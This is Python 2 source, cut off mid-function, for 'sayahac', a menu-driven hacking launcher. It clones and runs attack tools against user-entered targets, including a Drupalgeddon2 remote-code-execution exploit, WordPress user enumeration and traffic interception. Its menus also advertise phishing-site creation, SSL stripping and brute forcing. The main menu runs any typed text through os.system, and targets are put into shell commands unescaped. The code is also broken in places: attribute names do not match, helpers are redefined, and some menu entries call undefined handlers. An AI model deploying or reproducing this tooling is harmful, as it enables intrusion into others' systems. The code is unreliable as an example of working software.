#!/usr/bin/env python2
#
#
#	   ,-,--.    ,---.                    ,---.      ,--.-,,-,--,   ,---.        _,.----.   
# 	,-.'-  _\ .--.'  \   ,--.-.  .-,--..--.'  \    /==/  /|=|  | .--.'  \     .' .' -   \  
#	/==/_ ,_.' \==\-/\ \ /==/- / /=/_ / \==\-/\ \   |==|_ ||=|, | \==\-/\ \   /==/  ,  ,-'  
#	\==\  \    /==/-|_\ |\==\, \/=/. /  /==/-|_\ |  |==| ,|/=| _| /==/-|_\ |  |==|-   |  .  
# 	\==\ -\   \==\,   - \\==\  \/ -/   \==\,   - \ |==|- `-' _ | \==\,   - \ |==|_   `-' \ 
#	 _\==\ ,\  /==/ -   ,| |==|  ,_/    /==/ -   ,| |==|  _     | /==/ -   ,| |==|   _  , | 
#	/==/\/ _ |/==/-  /\ - \\==\-, /    /==/-  /\ - \|==|   .-. ,\/==/-  /\ - \\==\.       / 
#	\==\ - , /\==\ _.\=\.-'/==/._/     \==\ _.\=\.-'/==/, //=/  |\==\ _.\=\.-' `-.`.___.-'  
# 	`--`---'  `--`        `--`-`       `--`        `--`-' `-`--` `--`                      
                 
#
#
#                                Greet's To
#                             Tools For Hacking
#                             Author : root_012

'''
Imports
'''
import sys
import argparse
import os
import httplib
import subprocess
import re
import urllib2
import socket
import urllib
import sys
import json
import telnetlib
import glob
import random
import Queue
import threading
import base64
import time
import ConfigParser
from sys import argv
from commands import *
from getpass import getpass
from xml.dom import minidom
from urlparse import urlparse
from optparse import OptionParser
from time import gmtime, strftime, sleep

'''
Common Functions
'''


class color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'


def clearScr():
    os.system('clear')


def yesOrNo():
    return (raw_input("Continue Y / N: ") in yes)


'''
Config
'''
installDir = os.path.dirname(os.path.abspath(__file__)) + '/'
configFile = installDir + "/sayahac.cfg"
print(installDir)
config = ConfigParser.RawConfigParser()
config.read(configFile)
toolDir = installDir + config.get('sayahac', 'toolDir')
logDir = installDir + config.get('sayahac', 'logDir')
yes = config.get('sayahac', 'yes').split()
color_random=[color.HEADER,color.IMPORTANT,color.NOTICE,color.OKBLUE,color.OKGREEN,color.WARNING,color.RED,color.END,color.UNDERLINE,color.LOGGING]
random.shuffle(color_random) 
fsocietylogo = color_random[0] + '''
  
   _     _      _     _      _     _      _     _      _     _      _     _      _     _   
  (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)    (c).-.(c)  
   / ._. \      / ._. \      / ._. \      / ._. \      / ._. \      / ._. \      / ._. \   
 __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__  __\( Y )/__ 
(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)(_.-/'-'\-._)
   || S ||      || A ||      || Y ||      || A ||      || H ||      || A ||      || C ||   
 _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._  _.' `-' '._ 
(.-./`-`\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)(.-./`-'\.-.)
 `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-'  `-'     `-' 
                                                                               
                                            
        '''
sayahacPrompt = "sayahac ~# "
alreadyInstalled = "Already Installed"
continuePrompt = "\nClick [Return] to continue"

termsAndConditions = color.NOTICE + '''
I shall not use sayahac to:
(i) upload or otherwise transmit, display or distribute any
content that infringes any trademark, trade secret, copyright
or other proprietary or intellectual property rights of any
person; (ii) upload or otherwise transmit any material that contains
software viruses or any other computer code, files or programs
designed to interrupt, destroy or limit the functionality of any
computer software or hardware or telecommunications equipment;
''' + color.END

mrrobot4 = color.NOTICE + '''
Hello,
        Welcome to sayahac framework


Thanks you,
'''

'''
Starts Menu Classes
'''
def agreement():
    while not config.getboolean("sayahac", "agreement"):
        clearScr()
        print(termsAndConditions)
        print(mrrobot4)
        agree = raw_input("You must agree to our terms and conditions first (Y/n) ").lower()
        if agree in yes:
            config.set('sayahac', 'agreement', 'true')

class sayahac:
    def __init__(self):
        clearScr()
        self.createFolders()
        print (fsocietylogo + color.RED + '''
       }--------------{+} Coded By Root-012 {+}--------------{
       }--------{+}  GitHub.com/Root-012/sayahac {+}--------{
    ''' + color.END + '''
       {1}--Information Gathering
       {2}--Password Attacks
       {3}--Wireless Testing
       {4}--Exploitation Tools
       {5}--Sniffing & Spoofing
       {6}--Web Hacking
       {7}--Post Exploitation
       {0}--INSTALL & UPDATE
       {99}-EXIT\n
     ''')
        choice = raw_input(sayahacPrompt)
        clearScr()
        if choice == "1":
            informationGatheringMenu()
        elif choice == "2":
            passwordAttacksMenu()
        elif choice == "3":
            wirelessTestingMenu()
        elif choice == "4":
            exploitationToolsMenu()
        elif choice == "5":
            sniffingSpoofingMenu()
        elif choice == "6":
            webHackingMenu()
        elif choice == "7":
            privateWebHacking()
        elif choice == "8":
            postExploitationMenu()
        elif choice == "0":
            self.update()
        elif choice == "99":
            with open(configFile, 'wb') as configfile:
                config.write(configfile)
            sys.exit()
        elif choice == "\r" or choice == "\n" or choice == "" or choice == " ":
            self.__init__()
        else:
            try:
                print(os.system(choice))
            except:
                pass
        self.completed()

    def createFolders(self):
        if not os.path.isdir(toolDir):
            os.makedirs(toolDir)
        if not os.path.isdir(logDir):
            os.makedirs(logDir)

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()

    def update(self):
        os.system("git clone --depth=1 https://github.com/Root-012/sayahac.git")
        os.system("cd sayahac && bash ./update.sh")
        os.system("sayahac")


class sniffingSpoofingMenu:
    menuLogo = ''' 
    
                                                                                                 
 _____         _   __   __  _               
/  ___|       (_) / _| / _|(_)              
\ `--.  _ __   _ | |_ | |_  _  _ __    __ _ 
 `--. \| '_ \ | ||  _||  _|| || '_ \  / _` |
/\__/ /| | | || || |  | |  | || | | || (_| |
\____/ |_| |_||_||_|  |_|  |_||_| |_| \__, |
                                       __/ |
                                      |___/ 
                                                                                             gggggg       

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print(
            "   {1}--SEToolkit - Tool aimed at penetration testing around Social-Engineering")
        print("   {2}--SSLtrip - MITM tool that implements SSL stripping  attacks")
        print(
            "   {3}--pyPISHER - Tool to create a mallicious website for password pishing")
        print("   {4}--SMTP Mailer - Tool to send SMTP mail\n ")
        print("   {99}-Back To Main Menu \n")
        choice6 = raw_input(sayahacPrompt)
        clearScr()
        if choice6 == "1":
            setoolkit()
        elif choice6 == "2":
            ssls()
        elif choice6 == "3":
            pisher()
        elif choice6 == "4":
            smtpsend()
        elif choice6 == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class webHackingMenu:
    menuLogo = '''
    
                                                                             
                                                         bbbbbbbb            
                                                         b::::::b            
                                                         b::::::b            
                                                         b::::::b            
                                                          b:::::b            
wwwwwww           wwwww           wwwwwww eeeeeeeeeeee    b:::::bbbbbbbbb    
 w:::::w         w:::::w         w:::::wee::::::::::::ee  b::::::::::::::bb  
  w:::::w       w:::::::w       w:::::we::::::eeeee:::::eeb::::::::::::::::b 
   w:::::w     w:::::::::w     w:::::we::::::e     e:::::eb:::::bbbbb:::::::b
    w:::::w   w:::::w:::::w   w:::::w e:::::::eeeee::::::eb:::::b    b::::::b
     w:::::w w:::::w w:::::w w:::::w  e:::::::::::::::::e b:::::b     b:::::b
      w:::::w:::::w   w:::::w:::::w   e::::::eeeeeeeeeee  b:::::b     b:::::b
       w:::::::::w     w:::::::::w    e:::::::e           b:::::b     b:::::b
        w:::::::w       w:::::::w     e::::::::e          b:::::bbbbbb::::::b
         w:::::w         w:::::w       e::::::::eeeeeeee  b::::::::::::::::b 
          w:::w           w:::w         ee:::::::::::::e  b:::::::::::::::b  
           www             www            eeeeeeeeeeeeee  bbbbbbbbbbbbbbbb   
                                                                             
                                                                             
                                                                             
                                                                             
                                                                             
                                                                             
                                                                             

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--Drupal Hacking ")
        print("   {2}--Inurlbr")
        print("   {3}--Nikto Web Server Tool")
        print("   {4}--HTTP/HTTPS interception Using Fiddlertool")
        print("   {5}--File Upload Checker")
        print("   {6}--Wordpress Exploit Scanner")
        print("   {7}--Wordpress Plugins Scanner")
        print("   {8}--Shell and Directory Finder")
        print("   {9}--Joomla! 1.5 - 3.4.5 remote code execution")
        print("   {10}-Vbulletin 5.X remote code execution")
        print(
            "   {11}-BruteX - Automatically brute force all services running on a target")
        print("   {12}-Arachni - Web Application Security Scanner Framework \n ")
        print("   {99}-Back To Main Menu \n")
        choiceweb = raw_input(sayahacPrompt)
        clearScr()
        if choiceweb == "1":
            DrupalExploitTool()
        elif choiceweb == "2":
            InurlbrTool()
        elif choiceweb == '3':
            NiktoTool()
        elif choiceweb == "4":
            FiddlerTool()
        elif choiceweb == "5":
            FuxploiderTool()
        elif choiceweb == "6":
            WPExploitTool()
        elif choiceweb == "7":
            wppluginscan()
        elif choiceweb == "8":
            shelltarget()
        elif choiceweb == "9":
            joomlarce()
        elif choiceweb == "10":
            vbulletinrce()
        elif choiceweb == "11":
            brutex()
        elif choiceweb == "12":
            ArachniTool()
        elif choiceweb == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class DrupalExploitTool:

    drupal_logo = """
  _____                     _
 |  __ \                   (_)
 | |  | |  _   _  _ __ ___   _
 | |  | | | | | || '_ ` _ \ | |
 | |__| | | |_| || | | | | || |
 |_____/   \__,_||_| |_| |_||_|
"""  
     
    
    def __init__(self):
        self.installDir = toolDir + "drupal-exploit"
        self.gitRepo = "https://github.com/dreadlocked/Drupalgeddon2.git"
        
        self.targetPrompt = "   Enter Target Drupal URL: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/drupalgeddon2.py")

    def install(self):
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && chmod +x drupalgeddon2.py" % self.installDir)

    def run(self):
        clearScr()
        print(self.drupalLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.drupalLogo)
        print("   Drupal Exploit for: %s\n" % target)
        print("   {1}--Check Vulnerability (CVE-2018-7600)")
        print("   {2}--Exploit RCE (Remote Code Execution)")
        print("   {99}-Return to previous menu \n")
        response = raw_input("drupal ~# ")
        clearScr()
        logPath = "logs/drupal-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("python3 %s/drupalgeddon2.py --check %s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("python3 %s/drupalgeddon2.py --exploit %s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."




class InurlbrTool:

    inurlbr_logo = """
  ___        _    _       
 |_ _|_ __  (_)  | | ___  
  | || '_ \ | |  | |/ _ \ 
  | || | | || |  | | (_) |
 |___|_| |_||_|  |_|\___/ 
"""

    
    def __init__(self):
        self.installDir = toolDir + "inurlbr"
        self.gitRepo = "https://github.com/googleinurl/SCANNER-INURLBR.git"
        
        self.targetPrompt = "   Enter Target URL/Domain: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile("/usr/bin/inurlbr") or os.path.isfile("/usr/local/bin/inurlbr")

    def install(self):
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && chmod +x inurlbr.php" % self.installDir)

    def run(self):
        clearScr()
        print(self.inurlbrLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.inurlbrLogo)
        print("   Inurlbr scan for: %s\n" % target)
        print("   {1}--Simple Scan (Basic search)")
        print("   {2}--Advanced Scan (Multiple search)")
        print("   {99}-Return to information gathering menu \n")
        response = raw_input("inurlbr ~# ")
        clearScr()
        logPath = "logs/inurlbr-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("php %s/inurlbr.php --dork %s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("php %s/inurlbr.php --dork-file %s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."

class WPExploitTool:
    wpexploit_logo = """
 __          __           _                            _      
 \ \        / /          | |                          | |     
  \ \  /\  / /__  _ __   | |    _   _  _ __   _ __   __| | ___ 
   \ \/  \/ // _ \| '_ \  | |   | | | || '_ \ | '__| / _` |/ __|
    \  /\  /|  __/| | | | | |___| |_| || |_) || |   | (_| |\__ \\
     \/  \/  \___||_| |_| |_____|\__,_|| .__/ |_|    \__,_||___/
                                      | |                       
                                      |_|                       
"""
    def __init__(self):
        self.installDir = toolDir + "wpscan-cli"
        self.gitRepo = "https://github.com/wpscanteam/wpscan.git"
        
        self.targetPrompt = "   Enter Target WordPress URL: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/wpscan.rb")

    def install(self):
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && gem install bundler && bundle install" % self.installDir)

    def run(self):
        clearScr()
        print(self.wpexploitLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.wpexploitLogo)
        print("   WordPress Exploit Scan for: %s\n" % target)
        print("   {1}--Basic Vulnerability Scan")
        print("   {2}--Enumerate Plugins")
        print("   {3}--Enumerate Users")
        print("   {99}-Return to previous menu \n")
        response = raw_input("wpscan ~# ")
        clearScr()
        logPath = "logs/wpexploit-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("ruby %s/wpscan.rb --url %s --enumerate vp > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("ruby %s/wpscan.rb --url %s --enumerate p > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("ruby %s/wpscan.rb --url %s --enumerate u > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."


class ArachniTool:
    arachni_logo = """
     ___                        _     _ 
    / _ \                      (_)   | |
   / /_\ \ _ __   __ _  _ __    _  __| |
   |  _  || '__| / _` || '_ \  | |/ _` |
   | | | || |   | (_| || | | | | | (_| |
   \_| |_/|_|    \__,_||_| |_| |_|\__,_|
"""
    def __init__(self):
        self.installDir = toolDir + "arachni"
        self.downloadUrl = "https://github.com/Arachni/arachni/releases/latest/download/arachni-x.x.x-x86_64-linux.tar.gz"
        self.extractedDir = self.installDir + "/arachni-x.x.x"

        self.targetPrompt = "   Enter Target URL for Vulnerability Scan: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.extractedDir + "/bin/arachni")

    def install(self):
        # Download and extract Arachni
        os.system("mkdir -p %s" % self.installDir)
        os.system("wget %s -O %s/arachni.tar.gz" % (self.downloadUrl, self.installDir))
        os.system("cd %s && tar -zxvf arachni.tar.gz" % self.installDir)

    def run(self):
        clearScr()
        print(self.arachniLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.arachniLogo)
        print("   Arachni Scan for: %s\n" % target)
        print("   {1}--Basic Scan")
        print("   {2}--Full Audit Scan")
        print("   {3}--Scan with Plugin")
        print("   {99}-Return to previous menu \n")
        response = raw_input("arachni ~# ")
        clearScr()
        logPath = "logs/arachni-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".afr"
        try:
            if response == "1":
                os.system("%s/bin/arachni %s --report-save-path=%s" % (self.extractedDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("%s/bin/arachni %s --checks=all --report-save-path=%s" % (self.extractedDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "3":
                plugin = raw_input("Enter the plugin name (e.g., xss, csrf): ")
                os.system("%s/bin/arachni %s --plugin=%s --report-save-path=%s" % (self.extractedDir, target, plugin, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."



class FuxploiderTool:
    fuxploider_logo = """
  ______              _       _           _           
 |  ____|            (_)     | |         | |          
 | |__ _ __ ___  __ _ _ _ __ | |__   ___ | | ___ _ __  
 |  __| '__/ _ \/ _` | | '_ \| '_ \ / _ \| |/ _ \ '__| 
 | |  | | |  __/ (_| | | | | | | | | (_) | |  __/ |    
 |_|  |_|  \___|\__, |_|_| |_|_| |_|\___/|_|\___|_|    
                __/ |                                  
               |___/                                   
"""
    def __init__(self):
        self.installDir = toolDir + "fuxploider"
        self.gitRepo = "https://github.com/almandin/fuxploider.git"
        
        self.targetPrompt = "   Enter Target URL for File Upload Vulnerability Check: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/fuxploider.py")

    def install(self):
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && pip install -r requirements.txt" % self.installDir)

    def run(self):
        clearScr()
        print(self.fuxploiderLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.fuxploiderLogo)
        print("   Fuxploider Scan for: %s\n" % target)
        print("   {1}--Basic File Upload Vulnerability Scan")
        print("   {2}--Advanced Scan with Extensions")
        print("   {99}-Return to previous menu \n")
        response = raw_input("fuxploider ~# ")
        clearScr()
        logPath = "logs/fuxploider-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("python2 %s/fuxploider.py --url %s --simple > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("python2 %s/fuxploider.py --url %s --extensions php,jpg,png --advanced > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."

class NiktoTool:
    nikto_logo = """
 _   _ _ _       _      
| \ | (_) |     (_)     
|  \| |_| |_ ___ _  ___ 
| . ` | | __/ __| |/ __|
| |\  | | |_\__ \ | (__ 
|_| \_|_|\__|___/_|\___|
"""
    def __init__(self):
        self.installDir = toolDir + "nikto"
        self.gitRepo = "https://github.com/sullo/nikto.git"
        
        self.targetPrompt = "   Enter Target URL for Vulnerability Scan: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/program/nikto.pl")

    def install(self):
        # Clone the Nikto repository and set it up
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))

    def run(self):
        clearScr()
        print(self.niktoLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.niktoLogo)
        print("   Nikto Scan for Target: %s\n" % target)
        print("   {1}--Basic Scan")
        print("   {2}--Scan with Tuning Options")
        print("   {3}--Scan for Specific Vulnerabilities")
        print("   {4}--Scan with Output to Report File")
        print("   {99}-Return to previous menu \n")
        response = raw_input("nikto ~# ")
        clearScr()
        logPath = "logs/nikto-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".txt"
        try:
            if response == "1":
                os.system("perl %s/program/nikto.pl -h %s" % (self.installDir, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                tuning = raw_input("Enter tuning options (e.g., 123bde): ")
                os.system("perl %s/program/nikto.pl -h %s -Tuning %s" % (self.installDir, target, tuning))
                response = raw_input(continuePrompt)
            elif response == "3":
                vuln_scan = raw_input("Enter vulnerability string to search (e.g., XSS, SQLI): ")
                os.system("perl %s/program/nikto.pl -h %s -T %s" % (self.installDir, target, vuln_scan))
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("perl %s/program/nikto.pl -h %s -output %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."

class FiddlerTool:
    fiddler_logo = """
  ______ _     _ _ _           
 |  ____| |   (_) | |          
 | |__  | |__  _| | |_   _  ___
 |  __| | '_ \| | | | | | |/ _ \\
 | |____| | | | | | | |_| |  __/
 |______|_| |_|_|_|_|\__,_|\___|
"""
    def __init__(self):
        self.installDir = toolDir + "mitmproxy"
        
        self.targetPrompt = "   Enter target host (e.g., example.com) or press Enter for all traffic: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        # Check if mitmproxy is installed
        return os.system("which mitmproxy > /dev/null 2>&1") == 0

    def install(self):
        # Install mitmproxy via pip
        os.system("pip install mitmproxy")

    def run(self):
        clearScr()
        print(self.fiddlerLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.fiddlerLogo)
        print("   Mitmproxy (Fiddler-like) for Target: %s\n" % (target if target else "All Traffic"))
        print("   {1}--Basic Intercept")
        print("   {2}--Log HTTP/HTTPS Traffic")
        print("   {3}--Filter by Hostname")
        print("   {4}--Save Traffic to File")
        print("   {99}-Return to previous menu \n")
        response = raw_input("mitmproxy ~# ")
        clearScr()
        logPath = "logs/mitmproxy-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("mitmproxy")
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("mitmproxy --showhost")
                response = raw_input(continuePrompt)
            elif response == "3":
                if not target:
                    target = raw_input("Enter target host: ")
                os.system("mitmproxy --set block_global=false -b %s" % target)
                response = raw_input(continuePrompt)
            elif response == "4":
                os.system("mitmproxy -w %s" % logPath)
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)

# Helper functions
def clearScr():
    os.system('clear')

toolDir = "/opt/tools/"  # Change to appropriate directory
continuePrompt = "Press Enter to continue..."




class postExploitationMenu:
    menuLogo = '''
    

______            _            _____              _         _  _   
| ___ \          | |          |  ___|            | |       (_)| |  
| |_/ /___   ___ | |_  ______ | |__ __  __ _ __  | |  ___   _ | |_ 
|  __// _ \ / __|| __||______||  __|\ \/ /| '_ \ | | / _ \ | || __|
| |  | (_) |\__ \| |_         | |___ >  < | |_) || || (_) || || |_ 
\_|   \___/ |___/ \__|        \____//_/\_\| .__/ |_| \___/ |_| \__|
                                          | |                      
                                          |_|                      

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)
        print("   {1}--Shell Checker")
        print("   {2}--POET")
        print("   {3}--Phishing Framework \n")
        print("   {99}-Return to main menu \n ")
        choice11 = raw_input(sayahacPrompt)
        clearScr()
        if choice11 == "1":
            sitechecker()
        elif choice11 == "2":
            poet()
        elif choice11 == "3":
            weeman()
        elif choice11 == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


'''
Information Gathering Tools Classes
'''


class informationGatheringMenu:
    menuLogo = '''
    

{__{___     {__{________  {____              {____       {_       
{__{_ {__   {__{__      {__    {__         {_    {__    {_ __     
{__{__ {__  {__{__    {__        {__      {__          {_  {__    
{__{__  {__ {__{______{__        {__{_____{__         {__   {__   
{__{__   {_ {__{__    {__        {__      {__   {____{______ {__  
{__{__    {_ __{__      {__     {__        {__    {_{__       {__ 
{__{__      {__{__        {____             {_____ {__         {__
                                                                  
                                                                       

    '''

    def __init__(self):
        clearScr()
        print(self.menuLogo)

        print("  {1}--Nmap - Network Mapper")
        print("  {2}--Recon-ng")
        print("  {3}--Host To IP")
        print("  {4}--WPScan")
        print("  {5}--CMSmap")
        print("  {6}--XSStrike")
        print("  {7}--Doork")
        print("  {8}--Crips\n  ")
        print("  {99}-Back To Main Menu \n")
        choice2 = raw_input(sayahacPrompt)
        clearScr()
        if choice2 == "1":
            nmap()
        elif choice2 == "2":
            ReconNGTool()
        elif choice2 == "3":
            host2ip()
        elif choice2 == "4":
            wpscan()
        elif choice2 == "5":
            CMSmap()
        elif choice2 == "6":
            XSStrike()
        elif choice2 == "7":
            GoogleDorkTool()
        elif choice2 == "8":
            crips()
        elif choice2 == "99":
            sayahac()
        else:
            self.__init__()
        self.completed()

    def completed(self):
        raw_input("Completed, click return to go back")
        self.__init__()


class nmap:
    nmapLogo = '''
    

                                                   
    _/      _/                                     
   _/_/    _/  _/_/_/  _/_/      _/_/_/  _/_/_/    
  _/  _/  _/  _/    _/    _/  _/    _/  _/    _/   
 _/    _/_/  _/    _/    _/  _/    _/  _/    _/    
_/      _/  _/    _/    _/    _/_/_/  _/_/_/       
                                     _/            
                                    _/             
 
                                                                                     

    '''

    def __init__(self):
        self.installDir = toolDir + "nmap"
        self.gitRepo = "https://github.com/nmap/nmap.git"

        self.targetPrompt = "   Enter Target IP/Subnet/Range/Host: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return (os.path.isfile("/usr/bin/nmap") or os.path.isfile("/usr/local/bin/nmap"))

    def install(self):
        os.system("git clone --depth=1 %s %s" %
                  (self.gitRepo, self.installDir))
        os.system("cd %s && ./configure && make && make install" %
                  self.installDir)

    def run(self):
        clearScr()
        print(self.nmapLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.nmapLogo)
        print("   Nmap scan for: %s\n" % target)
        print("   {1}--Simple Scan [-sV]")
        print("   {2}--Firewall Scan [-Pn]")
        print("   {3}--Aggressive Scan [-A]\n")
        print("   {99}-Return to information gathering menu \n")
        response = raw_input("nmap ~# ")
        clearScr()
        logPath = "logs/nmap-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime())
        try:
            if response == "1":
                os.system("nmap -sV -oN %s %s" % (logPath, target))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("nmap -Pn -oN %s %s" % (logPath, target))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("nmap -A -oN %s %s" % (logPath, target))
                response = raw_input(continuePrompt)
            elif response == "99":
                pass
            else:
                self.menu(target)
        except KeyboardInterrupt:
            self.menu(target)



class ReconNGTool:
    recon_logo = """
  ______               _   _      _   _   
 |  ____|             (_) | |    (_) | |  
 | |__     ___   ___   _  | | __  _  | |_ 
 |  __|   / _ \ / _ \ | | | |/ / | | | __|
 | |     |  __/| (_) || | |   <  | | | |_ 
 |_|      \___| \___/ |_| |_|\_\ |_|  \__|
"""
    def __init__(self):
        self.installDir = toolDir + "recon-ng"
        self.gitRepo = "https://github.com/lanmaster53/recon-ng.git"
        
        self.targetPrompt = "   Enter the domain or IP to gather intelligence on: "

        if not self.installed():
            self.install()
            self.run()
        else:
            self.run()

    def installed(self):
        return os.path.isfile(self.installDir + "/recon-ng")

    def install(self):
        # Clone the Recon-ng repository
        os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        os.system("cd %s && pip install -r REQUIREMENTS" % self.installDir)

    def run(self):
        clearScr()
        print(self.reconLogo)
        target = raw_input(self.targetPrompt)
        self.menu(target)

    def menu(self, target):
        clearScr()
        print(self.reconLogo)
        print("   Recon-ng Intelligence Gathering for: %s\n" % target)
        print("   {1}--Basic Domain Info Gathering")
        print("   {2}--Whois Lookup")
        print("   {3}--DNS Enumeration")
        print("   {4}--IP Geolocation")
        print("   {5}--Gather Contacts (Email, Name)")
        print("   {99}-Return to previous menu \n")
        response = raw_input("recon-ng ~# ")
        clearScr()
        logPath = "logs/recon-ng-" + strftime("%Y-%m-%d_%H:%M:%S", gmtime()) + ".log"
        try:
            if response == "1":
                os.system("%s/recon-ng -m recon/domains-hosts/shodan_hostname -o SOURCE=%s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "2":
                os.system("%s/recon-ng -m recon/domains-hosts/whois_pocs -o SOURCE=%s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "3":
                os.system("%s/recon-ng -m recon/domains-hosts/brute_hosts -o SOURCE=%s > %s" % (self.installDir, target, logPath))
                response = raw_input(continuePrompt)
            elif response == "4":
